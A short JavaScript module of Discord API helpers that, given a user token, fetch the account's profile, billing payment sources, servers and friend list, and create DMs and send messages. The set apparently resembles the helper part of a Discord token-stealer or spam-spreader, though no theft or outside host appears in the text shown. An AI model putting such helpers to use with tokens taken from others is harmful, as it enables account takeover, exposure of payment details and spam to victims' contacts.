// START HELPER FUNCTIONS //
async function getUserData(token) {
    const data = await fetch(`https://discord.com/api/v9/users/@me`, {
        "headers": {
          "Accept": "*/*",
          "Accept-Language": "en-US,en;q=0.9",
          "Authorization": `${token}`,
          "Content-Type": "application/json",
        },
        "body": null,
        "method": "GET"
    });
    return data;
}
async function getUserBilling(token) {
    const data = await fetch(`https://discord.com/api/v9/users/@me/billing/payment-sources`, {
        "headers": {
          "Accept": "*/*",
          "Accept-Language": "en-US,en;q=0.9",
          "Authorization": `${token}`,
          "Content-Type": "application/json",
        },
        "body": null,
        "method": "GET"
    });
    return data;
}
async function getUserGuilds(token) {
    const data = await fetch(`https://discord.com/api/v9/users/@me/guilds`, {
        "headers": {
          "Accept": "*/*",
          "Accept-Language": "en-US,en;q=0.9",
          "Authorization": `${token}`,
          "Content-Type": "application/json",
        },
        "body": null,
        "method": "GET"
    });
    return data;
}
async function getRelationships(token) {
    const data = await fetch(`https://discord.com/api/v9/users/@me/relationships`, {
        "headers": {
          "Accept": "*/*",
          "Accept-Language": "en-US,en;q=0.9",
          "Authorization": `${token}`,
          "Content-Type": "application/json",
        },
        "body": null,
        "method": "GET"
    });
    return data;
}
async function createDm(token, userId) {
    const data = await fetch("https://discord.com/api/v9/users/@me/channels", {
        "headers": {
            "Authorization": `${token}`,
            'Content-Type': "application/json"
        },
        "body": `{\"recipient_id\":\"${userId}\"}`,
        "method": "POST"
    });
    return data;
}
async function sendMessage(channelId, token, messageContent) {
    const data = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
        "headers": {
          "accept": "*/*",
          "accept-language": "en-US,en;q=0.9",
          "authorization": `${token}`,
          "content-type": "application/json",
        },
        "body": `{\"content\":\"${messageContent}\"}`,
        "method": "POST"
    });
    return data;
}
// END HELPER FUNCTIONS //

module.exports = {
    getUserData,
    getUserBilling,
    getUserGuilds,
    getRelationships,
    createDm,
    sendMessage
}